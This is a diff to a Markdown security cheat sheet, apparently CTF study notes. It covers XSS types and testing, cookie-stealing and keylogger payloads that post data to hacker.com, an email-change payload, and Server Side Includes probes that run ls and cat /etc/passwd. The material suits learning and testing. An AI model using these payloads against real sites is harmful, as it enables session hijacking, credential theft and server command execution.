@@ -152,7 +152,7 @@
 [Observatory by Mozilla](https://observatory.mozilla.org)- set of tools to analyze your website.    
 [Office Recovery](https://online.officerecovery.com/pixrecovery/) - repair corrupt JPEG, PNG, GIF, BMP, TIFF, and RAW images.  
 [PDF24](https://tools.pdf24.org/) - free and easy to use online PDF tools    
-[Phishtool](https://www.phishtool.com) - PhishTool is a free phishing simulation tool.   
+[Phishtool](https://www.phishtool.com) - PhishTool is a free phishing simulation tool.  
 [NPiet](https://www.bertnase.de/npiet/npiet-execute.php) - Piet is an esoteric programming language based of using colored pixels to represent commands.  
 [Ping.eu](https://ping.eu/) - online Ping, Traceroute, DNS lookup, WHOIS and others.      
 [pipl](https://pipl.com/) - is the place to find the person behind the email address, social username or phone number.  
@@ -2196,13 +2196,13 @@ This is when an attack payload is executed by manipulating the DOM (Document Obj
 DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.
 
 **Example Scenario:**  
-The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
+The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
 
 **Potential Impact:**
 Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.
 
 **How to test for Dom Based XSS:**
-DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.
+DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "`window.location.x`" parameters.
 
 When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval()
 
@@ -2219,6 +2219,14 @@ You'll need to test every possible point of entry; these include:
 * Parameters in the URL Query String
 * URL File Path
 * Sometimes HTTP Headers (although unlikely exploitable in practice)
+
+A small test to see if a reflected XSS is possible is to enter a single quote (`'`) into the input field and see if the page breaks or shows an error message. If it does, then it's likely exploitable.
+
+Another way to test for reflected XSS is to enter the following payload into the input field:  
+```html
+ "><script>alert("exploitable")</script> 
+``` 
+If the page shows an alert box saying "exploitable", then it's likely exploitable.
 
 ### Stored XSS
 As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
@@ -2254,19 +2262,27 @@ The intention is what you wish the JavaScript to actually do, and the modificati
 ### Some examples of XSS intentions.
 **Proof Of Concept:**  
 This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:  
-`<script>alert('XSS');</script>`
+```html
+<script>alert('XSS');</script>
+```
 
 **Session Stealing:**  
 Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.  
-`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
+```html
+<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
+```
 
 **Key Logger:**  
 The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.  
-`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
+```html
+<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
+```
 
 **Business Logic:**  
 This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this: 
-`<script>user.changeEmail('attacker@hacker.thm');</script>`
+```html
+<script>user.changeEmail('attacker@hacker.com');</script>
+```
 
 ### A command to rule them all (Polyglots)
 An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. 
@@ -2321,7 +2337,13 @@ Directory traversal can also be used on some cases, and so can the `&x=` to stop
 
 This IP address may contain sensitive data in a cloud environment:    
 `169.254.169.254`
+## Server Side Includes
+Server Side Includes (SSI) is a simple interpreted server-side scripting language used almost exclusively for the Web. It is most useful for including the contents of one or more files into a web page on a web server, using its #include directive.
 
+### Finding an SSI
+* `<!--#exec cmd="ls" -->`
+* `<!--#echo var="DATE_LOCAL" -->`
+* `<!--#exec cmd="cat /etc/passwd" -->`
 # Forensics
 Is simply 'the art of uncovering'
 
